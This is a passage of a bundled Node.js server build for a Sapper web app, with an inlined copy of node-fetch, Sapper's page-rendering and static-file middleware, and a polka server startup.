	}
	if (contentLengthValue) {
		headers.set('Content-Length', contentLengthValue);
	}

	// HTTP-network-or-cache fetch step 2.11
	if (!headers.has('User-Agent')) {
		headers.set('User-Agent', 'node-fetch/1.0 (+https://github.com/bitinn/node-fetch)');
	}

	// HTTP-network-or-cache fetch step 2.15
	if (request.compress && !headers.has('Accept-Encoding')) {
		headers.set('Accept-Encoding', 'gzip,deflate');
	}

	let agent = request.agent;
	if (typeof agent === 'function') {
		agent = agent(parsedURL);
	}

	if (!headers.has('Connection') && !agent) {
		headers.set('Connection', 'close');
	}

	// HTTP-network fetch step 4.2
	// chunked encoding is handled by Node.js

	return Object.assign({}, parsedURL, {
		method: request.method,
		headers: exportNodeCompatibleHeaders(headers),
		agent
	});
}

/**
 * abort-error.js
 *
 * AbortError interface for cancelled requests
 */

/**
 * Create AbortError instance
 *
 * @param   String      message      Error message for human
 * @return  AbortError
 */
function AbortError(message) {
  Error.call(this, message);

  this.type = 'aborted';
  this.message = message;

  // hide custom error implementation details from end-users
  Error.captureStackTrace(this, this.constructor);
}

AbortError.prototype = Object.create(Error.prototype);
AbortError.prototype.constructor = AbortError;
AbortError.prototype.name = 'AbortError';

// fix an issue where "PassThrough", "resolve" aren't a named export for node <10
const PassThrough$1 = Stream.PassThrough;
const resolve_url = Url.resolve;

/**
 * Fetch function
 *
 * @param   Mixed    url   Absolute url or Request instance
 * @param   Object   opts  Fetch options
 * @return  Promise
 */
function fetch(url, opts) {

	// allow custom promise
	if (!fetch.Promise) {
		throw new Error('native promise missing, set fetch.Promise to your favorite alternative');
	}

	Body.Promise = fetch.Promise;

	// wrap http.request into fetch
	return new fetch.Promise(function (resolve, reject) {
		// build request object
		const request = new Request(url, opts);
		const options = getNodeRequestOptions(request);

		const send = (options.protocol === 'https:' ? https : http).request;
		const signal = request.signal;

		let response = null;

		const abort = function abort() {
			let error = new AbortError('The user aborted a request.');
			reject(error);
			if (request.body && request.body instanceof Stream.Readable) {
				request.body.destroy(error);
			}
			if (!response || !response.body) return;
			response.body.emit('error', error);
		};

		if (signal && signal.aborted) {
			abort();
			return;
		}

		const abortAndFinalize = function abortAndFinalize() {
			abort();
			finalize();
		};

		// send request
		const req = send(options);
		let reqTimeout;

		if (signal) {
			signal.addEventListener('abort', abortAndFinalize);
		}

		function finalize() {
			req.abort();
			if (signal) signal.removeEventListener('abort', abortAndFinalize);
			clearTimeout(reqTimeout);
		}

		if (request.timeout) {
			req.once('socket', function (socket) {
				reqTimeout = setTimeout(function () {
					reject(new FetchError(`network timeout at: ${request.url}`, 'request-timeout'));
					finalize();
				}, request.timeout);
			});
		}

		req.on('error', function (err) {
			reject(new FetchError(`request to ${request.url} failed, reason: ${err.message}`, 'system', err));
			finalize();
		});

		req.on('response', function (res) {
			clearTimeout(reqTimeout);

			const headers = createHeadersLenient(res.headers);

			// HTTP fetch step 5
			if (fetch.isRedirect(res.statusCode)) {
				// HTTP fetch step 5.2
				const location = headers.get('Location');

				// HTTP fetch step 5.3
				const locationURL = location === null ? null : resolve_url(request.url, location);

				// HTTP fetch step 5.5
				switch (request.redirect) {
					case 'error':
						reject(new FetchError(`redirect mode is set to error: ${request.url}`, 'no-redirect'));
						finalize();
						return;
					case 'manual':
						// node-fetch-specific step: make manual redirect a bit easier to use by setting the Location header value to the resolved URL.
						if (locationURL !== null) {
							// handle corrupted header
							try {
								headers.set('Location', locationURL);
							} catch (err) {
								// istanbul ignore next: nodejs server prevent invalid response headers, we can't test this through normal request
								reject(err);
							}
						}
						break;
					case 'follow':
						// HTTP-redirect fetch step 2
						if (locationURL === null) {
							break;
						}

						// HTTP-redirect fetch step 5
						if (request.counter >= request.follow) {
							reject(new FetchError(`maximum redirect reached at: ${request.url}`, 'max-redirect'));
							finalize();
							return;
						}

						// HTTP-redirect fetch step 6 (counter increment)
						// Create a new Request object.
						const requestOpts = {
							headers: new Headers(request.headers),
							follow: request.follow,
							counter: request.counter + 1,
							agent: request.agent,
							compress: request.compress,
							method: request.method,
							body: request.body,
							signal: request.signal,
							timeout: request.timeout
						};

						// HTTP-redirect fetch step 9
						if (res.statusCode !== 303 && request.body && getTotalBytes(request) === null) {
							reject(new FetchError('Cannot follow redirect with body being a readable stream', 'unsupported-redirect'));
							finalize();
							return;
						}

						// HTTP-redirect fetch step 11
						if (res.statusCode === 303 || (res.statusCode === 301 || res.statusCode === 302) && request.method === 'POST') {
							requestOpts.method = 'GET';
							requestOpts.body = undefined;
							requestOpts.headers.delete('content-length');
						}

						// HTTP-redirect fetch step 15
						resolve(fetch(new Request(locationURL, requestOpts)));
						finalize();
						return;
				}
			}

			// prepare response
			res.once('end', function () {
				if (signal) signal.removeEventListener('abort', abortAndFinalize);
			});
			let body = res.pipe(new PassThrough$1());

			const response_options = {
				url: request.url,
				status: res.statusCode,
				statusText: res.statusMessage,
				headers: headers,
				size: request.size,
				timeout: request.timeout,
				counter: request.counter
			};

			// HTTP-network fetch step 12.1.1.3
			const codings = headers.get('Content-Encoding');

			// HTTP-network fetch step 12.1.1.4: handle content codings

			// in following scenarios we ignore compression support
			// 1. compression support is disabled
			// 2. HEAD request
			// 3. no Content-Encoding header
			// 4. no content response (204)
			// 5. content not modified response (304)
			if (!request.compress || request.method === 'HEAD' || codings === null || res.statusCode === 204 || res.statusCode === 304) {
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// For Node v6+
			// Be less strict when decoding compressed responses, since sometimes
			// servers send slightly invalid responses that are still accepted
			// by common browsers.
			// Always using Z_SYNC_FLUSH is what cURL does.
			const zlibOptions = {
				flush: zlib.Z_SYNC_FLUSH,
				finishFlush: zlib.Z_SYNC_FLUSH
			};

			// for gzip
			if (codings == 'gzip' || codings == 'x-gzip') {
				body = body.pipe(zlib.createGunzip(zlibOptions));
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// for deflate
			if (codings == 'deflate' || codings == 'x-deflate') {
				// handle the infamous raw deflate response from old servers
				// a hack for old IIS and Apache servers
				const raw = res.pipe(new PassThrough$1());
				raw.once('data', function (chunk) {
					// see http://stackoverflow.com/questions/37519828
					if ((chunk[0] & 0x0F) === 0x08) {
						body = body.pipe(zlib.createInflate());
					} else {
						body = body.pipe(zlib.createInflateRaw());
					}
					response = new Response(body, response_options);
					resolve(response);
				});
				return;
			}

			// for br
			if (codings == 'br' && typeof zlib.createBrotliDecompress === 'function') {
				body = body.pipe(zlib.createBrotliDecompress());
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// otherwise, use response as-is
			response = new Response(body, response_options);
			resolve(response);
		});

		writeToStream(req, request);
	});
}
/**
 * Redirect code matching
 *
 * @param   Number   code  Status code
 * @return  Boolean
 */
fetch.isRedirect = function (code) {
	return code === 301 || code === 302 || code === 303 || code === 307 || code === 308;
};

// expose Promise
fetch.Promise = global.Promise;

function get_page_handler(
	manifest,
	session_getter
) {
	const get_build_info =  (assets => () => assets)(JSON.parse(fs.readFileSync(path.join(build_dir, 'build.json'), 'utf-8')));

	const template =  (str => () => str)(read_template(build_dir));

	const has_service_worker = fs.existsSync(path.join(build_dir, 'service-worker.js'));

	const { server_routes, pages } = manifest;
	const error_route = manifest.error;

	function bail(req, res, err) {
		console.error(err);

		const message =  'Internal server error';

		res.statusCode = 500;
		res.end(`<pre>${message}</pre>`);
	}

	function handle_error(req, res, statusCode, error) {
		handle_page({
			pattern: null,
			parts: [
				{ name: null, component: error_route }
			]
		}, req, res, statusCode, error || new Error('Unknown error in preload function'));
	}

	async function handle_page(page, req, res, status = 200, error = null) {
		const is_service_worker_index = req.path === '/service-worker-index.html';
		const build_info




 = get_build_info();

		res.setHeader('Content-Type', 'text/html');
		res.setHeader('Cache-Control',  'max-age=600');

		// preload main.js and current route
		// TODO detect other stuff we can preload? images, CSS, fonts?
		let preloaded_chunks = Array.isArray(build_info.assets.main) ? build_info.assets.main : [build_info.assets.main];
		if (!error && !is_service_worker_index) {
			page.parts.forEach(part => {
				if (!part) return;

				// using concat because it could be a string or an array. thanks webpack!
				preloaded_chunks = preloaded_chunks.concat(build_info.assets[part.name]);
			});
		}

		if (build_info.bundler === 'rollup') {
			// TODO add dependencies and CSS
			const link = preloaded_chunks
				.filter(file => file && !file.match(/\.map$/))
				.map(file => `<${req.baseUrl}/client/${file}>;rel="modulepreload"`)
				.join(', ');

			res.setHeader('Link', link);
		} else {
			const link = preloaded_chunks
				.filter(file => file && !file.match(/\.map$/))
				.map((file) => {
					const as = /\.css$/.test(file) ? 'style' : 'script';
					return `<${req.baseUrl}/client/${file}>;rel="preload";as="${as}"`;
				})
				.join(', ');

			res.setHeader('Link', link);
		}

		const session = session_getter(req, res);

		let redirect;
		let preload_error;

		const preload_context = {
			redirect: (statusCode, location) => {
				if (redirect && (redirect.statusCode !== statusCode || redirect.location !== location)) {
					throw new Error(`Conflicting redirects`);
				}
				location = location.replace(/^\//g, ''); // leading slash (only)
				redirect = { statusCode, location };
			},
			error: (statusCode, message) => {
				preload_error = { statusCode, message };
			},
			fetch: (url, opts) => {
				const parsed = new Url.URL(url, `http://127.0.0.1:${process.env.PORT}${req.baseUrl ? req.baseUrl + '/' :''}`);

				if (opts) {
					opts = Object.assign({}, opts);

					const include_cookies = (
						opts.credentials === 'include' ||
						opts.credentials === 'same-origin' && parsed.origin === `http://127.0.0.1:${process.env.PORT}`
					);

					if (include_cookies) {
						opts.headers = Object.assign({}, opts.headers);

						const cookies = Object.assign(
							{},
							cookie.parse(req.headers.cookie || ''),
							cookie.parse(opts.headers.cookie || '')
						);

						const set_cookie = res.getHeader('Set-Cookie');
						(Array.isArray(set_cookie) ? set_cookie : [set_cookie]).forEach(str => {
							const match = /([^=]+)=([^;]+)/.exec(str);
							if (match) cookies[match[1]] = match[2];
						});

						const str = Object.keys(cookies)
							.map(key => `${key}=${cookies[key]}`)
							.join('; ');

						opts.headers.cookie = str;
					}
				}

				return fetch(parsed.href, opts);
			}
		};

		let preloaded;
		let match;
		let params;

		try {
			const root_preloaded = manifest.root_preload
				? manifest.root_preload.call(preload_context, {
					host: req.headers.host,
					path: req.path,
					query: req.query,
					params: {}
				}, session)
				: {};

			match = error ? null : page.pattern.exec(req.path);


			let toPreload = [root_preloaded];
			if (!is_service_worker_index) {
				toPreload = toPreload.concat(page.parts.map(part => {
					if (!part) return null;

					// the deepest level is used below, to initialise the store
					params = part.params ? part.params(match) : {};

					return part.preload
						? part.preload.call(preload_context, {
							host: req.headers.host,
							path: req.path,
							query: req.query,
							params
						}, session)
						: {};
				}));
			}

			preloaded = await Promise.all(toPreload);
		} catch (err) {
			if (error) {
				return bail(req, res, err)
			}

			preload_error = { statusCode: 500, message: err };
			preloaded = []; // appease TypeScript
		}

		try {
			if (redirect) {
				const location = Url.resolve((req.baseUrl || '') + '/', redirect.location);

				res.statusCode = redirect.statusCode;
				res.setHeader('Location', location);
				res.end();

				return;
			}

			if (preload_error) {
				handle_error(req, res, preload_error.statusCode, preload_error.message);
				return;
			}

			const segments = req.path.split('/').filter(Boolean);

			// TODO make this less confusing
			const layout_segments = [segments[0]];
			let l = 1;

			page.parts.forEach((part, i) => {
				layout_segments[l] = segments[i + 1];
				if (!part) return null;
				l++;
			});

			const props = {
				stores: {
					page: {
						subscribe: writable({
							host: req.headers.host,
							path: req.path,
							query: req.query,
							params
						}).subscribe
					},
					preloading: {
						subscribe: writable(null).subscribe
					},
					session: writable(session)
				},
				segments: layout_segments,
				status: error ? status : 200,
				error: error ? error instanceof Error ? error : { message: error } : null,
				level0: {
					props: preloaded[0]
				},
				level1: {
					segment: segments[0],
					props: {}
				}
			};

			if (!is_service_worker_index) {
				let l = 1;
				for (let i = 0; i < page.parts.length; i += 1) {
					const part = page.parts[i];
					if (!part) continue;

					props[`level${l++}`] = {
						component: part.component,
						props: preloaded[i + 1] || {},
						segment: segments[i]
					};
				}
			}

			const { html, head, css } = App.render(props);

			const serialized = {
				preloaded: `[${preloaded.map(data => try_serialize(data)).join(',')}]`,
				session: session && try_serialize(session, err => {
					throw new Error(`Failed to serialize session data: ${err.message}`);
				}),
				error: error && try_serialize(props.error)
			};

			let script = `__SAPPER__={${[
				error && `error:${serialized.error},status:${status}`,
				`baseUrl:"${req.baseUrl}"`,
				serialized.preloaded && `preloaded:${serialized.preloaded}`,
				serialized.session && `session:${serialized.session}`
			].filter(Boolean).join(',')}};`;

			if (has_service_worker) {
				script += `if('serviceWorker' in navigator)navigator.serviceWorker.register('${req.baseUrl}/service-worker.js');`;
			}

			const file = [].concat(build_info.assets.main).filter(file => file && /\.js$/.test(file))[0];
			const main = `${req.baseUrl}/client/${file}`;

			if (build_info.bundler === 'rollup') {
				if (build_info.legacy_assets) {
					const legacy_main = `${req.baseUrl}/client/legacy/${build_info.legacy_assets.main}`;
					script += `(function(){try{eval("async function x(){}");var main="${main}"}catch(e){main="${legacy_main}"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="${req.baseUrl}/client/shimport@${build_info.shimport}.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());`;
				} else {
					script += `var s=document.createElement("script");try{new Function("if(0)import('')")();s.src="${main}";s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="${req.baseUrl}/client/shimport@${build_info.shimport}.js";s.setAttribute("data-main","${main}")}document.head.appendChild(s)`;
				}
			} else {
				script += `</script><script src="${main}">`;
			}

			let styles;

			// TODO make this consistent across apps
			// TODO embed build_info in placeholder.ts
			if (build_info.css && build_info.css.main) {
				const css_chunks = new Set();
				if (build_info.css.main) css_chunks.add(build_info.css.main);
				page.parts.forEach(part => {
					if (!part) return;
					const css_chunks_for_part = build_info.css.chunks[part.file];

					if (css_chunks_for_part) {
						css_chunks_for_part.forEach(file => {
							css_chunks.add(file);
						});
					}
				});

				styles = Array.from(css_chunks)
					.map(href => `<link rel="stylesheet" href="client/${href}">`)
					.join('');
			} else {
				styles = (css && css.code ? `<style>${css.code}</style>` : '');
			}

			// users can set a CSP nonce using res.locals.nonce
			const nonce_attr = (res.locals && res.locals.nonce) ? ` nonce="${res.locals.nonce}"` : '';

			const body = template()
				.replace('%sapper.base%', () => `<base href="${req.baseUrl}/">`)
				.replace('%sapper.scripts%', () => `<script${nonce_attr}>${script}</script>`)
				.replace('%sapper.html%', () => html)
				.replace('%sapper.head%', () => `<noscript id='sapper-head-start'></noscript>${head}<noscript id='sapper-head-end'></noscript>`)
				.replace('%sapper.styles%', () => styles);

			res.statusCode = status;
			res.end(body);
		} catch(err) {
			if (error) {
				bail(req, res, err);
			} else {
				handle_error(req, res, 500, err);
			}
		}
	}

	return function find_route(req, res, next) {
		if (req.path === '/service-worker-index.html') {
			const homePage = pages.find(page => page.pattern.test('/'));
			handle_page(homePage, req, res);
			return;
		}

		for (const page of pages) {
			if (page.pattern.test(req.path)) {
				handle_page(page, req, res);
				return;
			}
		}

		handle_error(req, res, 404, 'Not found');
	};
}

function read_template(dir = build_dir) {
	return fs.readFileSync(`${dir}/template.html`, 'utf-8');
}

function try_serialize(data, fail) {
	try {
		return devalue(data);
	} catch (err) {
		if (fail) fail(err);
		return null;
	}
}

function middleware(opts


 = {}) {
	const { session, ignore } = opts;

	let emitted_basepath = false;

	return compose_handlers(ignore, [
		(req, res, next) => {
			if (req.baseUrl === undefined) {
				let { originalUrl } = req;
				if (req.url === '/' && originalUrl[originalUrl.length - 1] !== '/') {
					originalUrl += '/';
				}

				req.baseUrl = originalUrl
					? originalUrl.slice(0, -req.url.length)
					: '';
			}

			if (!emitted_basepath && process.send) {
				process.send({
					__sapper__: true,
					event: 'basepath',
					basepath: req.baseUrl
				});

				emitted_basepath = true;
			}

			if (req.path === undefined) {
				req.path = req.url.replace(/\?.*/, '');
			}

			next();
		},

		fs.existsSync(path.join(build_dir, 'service-worker.js')) && serve({
			pathname: '/service-worker.js',
			cache_control: 'no-cache, no-store, must-revalidate'
		}),

		fs.existsSync(path.join(build_dir, 'service-worker.js.map')) && serve({
			pathname: '/service-worker.js.map',
			cache_control: 'no-cache, no-store, must-revalidate'
		}),

		serve({
			prefix: '/client/',
			cache_control:  'max-age=31536000, immutable'
		}),

		get_server_route_handler(manifest.server_routes),

		get_page_handler(manifest, session || noop$1)
	].filter(Boolean));
}

function compose_handlers(ignore, handlers) {
	const total = handlers.length;

	function nth_handler(n, req, res, next) {
		if (n >= total) {
			return next();
		}

		handlers[n](req, res, () => nth_handler(n+1, req, res, next));
	}

	return !ignore
		? (req, res, next) => nth_handler(0, req, res, next)
		: (req, res, next) => {
			if (should_ignore(req.path, ignore)) {
				next();
			} else {
				nth_handler(0, req, res, next);
			}
		};
}

function should_ignore(uri, val) {
	if (Array.isArray(val)) return val.some(x => should_ignore(uri, x));
	if (val instanceof RegExp) return val.test(uri);
	if (typeof val === 'function') return val(uri);
	return uri.startsWith(val.charCodeAt(0) === 47 ? val : `/${val}`);
}

function serve({ prefix, pathname, cache_control }



) {
	const filter = pathname
		? (req) => req.path === pathname
		: (req) => req.path.startsWith(prefix);

	const cache = new Map();

	const read =  (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.join(build_dir, file)))).get(file);

	return (req, res, next) => {
		if (filter(req)) {
			const type = lite.getType(req.path);

			try {
				const file = path.posix.normalize(decodeURIComponent(req.path));
				const data = read(file);

				res.setHeader('Content-Type', type);
				res.setHeader('Cache-Control', cache_control);
				res.end(data);
			} catch (err) {
				res.statusCode = 404;
				res.end('not found');
			}
		} else {
			next();
		}
	};
}

function noop$1(){}

const { PORT, NODE_ENV } = process.env;
const dev = NODE_ENV === 'development';

polka() // You can also use Express
	.use(
		compression({ threshold: 0 }),
		sirv('static', { dev }),
		middleware()
	)
	.listen(PORT, err => {
		if (err) console.log('error', err);
	});
